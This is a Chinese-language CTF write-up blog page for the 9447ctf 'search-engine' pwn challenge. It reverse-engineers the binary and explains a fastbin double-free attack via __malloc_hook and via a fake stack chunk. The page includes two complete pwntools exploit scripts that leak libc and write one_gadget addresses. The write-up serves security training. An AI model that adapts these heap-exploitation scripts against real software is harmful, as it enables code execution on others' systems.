@@ -1,0 +1,713 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon/icon.jpg">
+  <link rel="icon" href="/img/favicon/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Eurus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="两种做法，打栈或者malloc_hook。fastbin_dup_into_stack只是fake chunk在栈上没啥好写的就不写专门的博客了感想：好坐牢好坐牢这道题真的做的好坐牢(╯‵□′)╯︵┻━┻！！！静态分析还是不行呜呜呜">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2015 9447ctf search-engine">
+<meta property="og:url" content="http://akaieurus.github.io/2023/01/31/2015-9447ctf-search-engine/index.html">
+<meta property="og:site_name" content="Eurus禁止摆烂！">
+<meta property="og:description" content="两种做法，打栈或者malloc_hook。fastbin_dup_into_stack只是fake chunk在栈上没啥好写的就不写专门的博客了感想：好坐牢好坐牢这道题真的做的好坐牢(╯‵□′)╯︵┻━┻！！！静态分析还是不行呜呜呜">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://akaieurus.github.io/img/posts/pc0.jpg">
+<meta property="article:published_time" content="2023-01-31T07:40:08.000Z">
+<meta property="article:modified_time" content="2025-01-03T10:22:07.424Z">
+<meta property="article:author" content="Eurus">
+<meta property="article:tag" content="fastbin dup">
+<meta property="article:tag" content="fastbin dup into stack">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://akaieurus.github.io/img/posts/pc0.jpg">
+  
+  
+  
+  <title>2015 9447ctf search-engine - Eurus禁止摆烂！</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"akaieurus.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Eurus&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/posts/pc0.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2015 9447ctf search-engine"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-31 15:40" pubdate>
+          2023年1月31日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2015 9447ctf search-engine</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>两种做法，打栈或者malloc_hook。fastbin_dup_into_stack只是fake chunk在栈上没啥好写的就不写专门的博客了<br>感想：好坐牢好坐牢这道题真的做的好坐牢(╯‵□′)╯︵┻━┻！！！静态分析还是不行呜呜呜</p>
+<span id="more"></span>
+
+<h1 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h1><p>主要两个功能函数，一个输入sentence提取其中的word加入链表（2-index），另一个查找单词（1-search）</p>
+<img src="/2023/01/31/2015-9447ctf-search-engine/main.png" srcset="/img/loading.gif" lazyload class title="main">
+<img src="/2023/01/31/2015-9447ctf-search-engine/menu.png" srcset="/img/loading.gif" lazyload class title="menu">
+<p>主要分析四个函数，index和search两个功能函数，read_num读取操作数的函数（fastbin_dup_into_stack用），read_enter读入内容</p>
+<h2 id="read-enter"><a href="#read-enter" class="headerlink" title="read_enter"></a>read_enter</h2><p>三个参数a1，a2，a3：</p>
+<ul>
+<li>a1是字符写入的地址</li>
+<li>a2是读入字节个数</li>
+<li>a3是一个选项。a3&#x3D;&#x3D;1时表示遇到’\n’时读入终止并将’\n’换成空字符，a3&#x3D;&#x3D;0时直到读入a2字节程序终止，没有结束符<img src="/2023/01/31/2015-9447ctf-search-engine/read_enter.png" srcset="/img/loading.gif" lazyload class title="read_enter"></li>
+</ul>
+<h2 id="read-num"><a href="#read-num" class="headerlink" title="read_num"></a>read_num</h2><ul>
+<li>read_enter读入48字节，允许’\n’提前终止读入</li>
+<li>nptr转换为数字，如果输入非数字会输出输入内容，递归执行read_num<img src="/2023/01/31/2015-9447ctf-search-engine/read_num.png" srcset="/img/loading.gif" lazyload class title="read_num"></li>
+</ul>
+<h2 id="index"><a href="#index" class="headerlink" title="index"></a>index</h2><ul>
+<li>malloc一个sentence chunk，读入句子（固定长度读入且无结束符）并初始化一些变量<img src="/2023/01/31/2015-9447ctf-search-engine/index1.png" srcset="/img/loading.gif" lazyload class title="index1"></li>
+<li>初始化第一个word chunk。word chunk存五个地址：word的地址（指向sentence chunk内）、word的长度、sentence的地址，sentence的长度、下一个word chunk的地址<img src="/2023/01/31/2015-9447ctf-search-engine/index2.png" srcset="/img/loading.gif" lazyload class title="index2"></li>
+<li>分词，将word链入链表<img src="/2023/01/31/2015-9447ctf-search-engine/index3.png" srcset="/img/loading.gif" lazyload class title="index3"></li>
+</ul>
+<h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p>流程不难，就是要注意第17行的判断（静态分析的时候没注意导致坐牢巨久）</p>
+<img src="/2023/01/31/2015-9447ctf-search-engine/search.png" srcset="/img/loading.gif" lazyload class title="search">
+
+<h1 id="两种方法"><a href="#两种方法" class="headerlink" title="两种方法"></a>两种方法</h1><h2 id="打malloc-hook"><a href="#打malloc-hook" class="headerlink" title="打malloc_hook"></a>打malloc_hook</h2><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>由于search会在删除sentence后清空chunk，所以可以通过search相同size的空字符找到相应的word chunk，实现uaf<br>注意申请chunk的size对齐0x10，不然next chunk的presize会被使用，free进unsorted bin会设置presize造成这部分内容不空，如下图所示</p>
+<img src="/2023/01/31/2015-9447ctf-search-engine/presize.png" srcset="/img/loading.gif" lazyload class title="presize">
+
+<h3 id="制造fastbin-double-free"><a href="#制造fastbin-double-free" class="headerlink" title="制造fastbin double free"></a>制造fastbin double free</h3><p>这道题制造double free的时候不一样的一点是要malloc三个块而不是两个。因为search时会先检测sentence是否为空，而fastbin的最后一个chunk的fd指针（chunk的data段开始）为null那么就相当于sentence为空，遍历链表的时候会跳过。所以第一个free的chunk是没法用的。</p>
+<h3 id="改fd打malloc-hook"><a href="#改fd打malloc-hook" class="headerlink" title="改fd打malloc_hook"></a>改fd打malloc_hook</h3><p>这就没啥了，套路</p>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,sentence</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,sentence)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">size,word,delete</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,word)<br>    p.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    s=p.recvuntil(<span class="hljs-string">b&#x27;Delete&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27; this sentence (y/n)?\n&#x27;</span>,delete)<br>    <span class="hljs-keyword">return</span> s<br><br>p=process(<span class="hljs-string">&#x27;./search&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>add(<span class="hljs-number">0x10a</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27; b&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>,<span class="hljs-string">b&#x27;n&#x27;</span>)<br>libcbase=u64(x[:<span class="hljs-number">8</span>])-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x5d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>malloc_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one_addr=libcbase+<span class="hljs-number">0xf0897</span><br>add(<span class="hljs-number">0x60</span>,p64(malloc_addr-<span class="hljs-number">0x23</span>)+<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_addr)+(<span class="hljs-number">0x60</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0x13</span>)*<span class="hljs-string">b&#x27;c&#x27;</span>)<br><span class="hljs-comment">#p.recv()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="打栈"><a href="#打栈" class="headerlink" title="打栈"></a>打栈</h2><p>跟上一种方法不一样的点就是开始要泄露栈地址以及在最后在栈上找fake chunk</p>
+<h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>就是利用read_enter读入48字节时不添加结束符和read_num如果输入非数字的话会输出输入的字符串（且递归调用自己）泄露栈上的内容<br>调用两次就能泄露出一个栈上的地址</p>
+<img src="/2023/01/31/2015-9447ctf-search-engine/stack.png" srcset="/img/loading.gif" lazyload class title="stack">
+
+<h3 id="找fake-chunk"><a href="#找fake-chunk" class="headerlink" title="找fake chunk"></a>找fake chunk</h3><p>这里我们劫持main函数的返回地址__libc_start_main+240，可以利用gdb的find_fake_fast找fake chunk</p>
+<img src="/2023/01/31/2015-9447ctf-search-engine/return.png" srcset="/img/loading.gif" lazyload class title="return">
+<p>注：我最开始想劫持sub_400D60的返回地址。最开始找了个7f的fake chunk，但显示malloc(): memory corruption (fast)了。最后发现是因为malloc的时候栈上的内容改变导致7f没了</p>
+<img src="/2023/01/31/2015-9447ctf-search-engine/malloc1.png" srcset="/img/loading.gif" lazyload class title="malloc1">
+<img src="/2023/01/31/2015-9447ctf-search-engine/malloc2.png" srcset="/img/loading.gif" lazyload class title="malloc2">
+
+<h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,sentence</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,sentence)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">size,word,delete</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,word)<br>    p.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    s=p.recvuntil(<span class="hljs-string">b&#x27;Delete&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27; this sentence (y/n)?\n&#x27;</span>,delete)<br>    <span class="hljs-keyword">return</span> s<br><br>p=process(<span class="hljs-string">&#x27;./search&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;is not a valid number\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>stack=u64(p.recv()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))+<span class="hljs-number">0x68</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-string">b&#x27;0x10a&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27; b&#x27;</span>)<br><span class="hljs-comment">#add(0x10a,b&#x27;a&#x27;*0x108+b&#x27; b&#x27;)</span><br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>,<span class="hljs-string">b&#x27;n&#x27;</span>)<br>libcbase=u64(x[:<span class="hljs-number">8</span>])-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br><span class="hljs-comment">#malloc_addr=libcbase+libc.symbols[&#x27;__malloc_hook&#x27;]</span><br>one_addr=libcbase+<span class="hljs-number">0xf0897</span><br>add(<span class="hljs-number">0x30</span>,p64(stack-<span class="hljs-number">0x16</span>)+<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">0x30</span>)<br>gdb.attach(p)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span>+p64(one_addr)+(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>)*<span class="hljs-string">b&#x27;c&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-comment">#p.recv()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/Heap/" class="category-chain-item">Heap</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
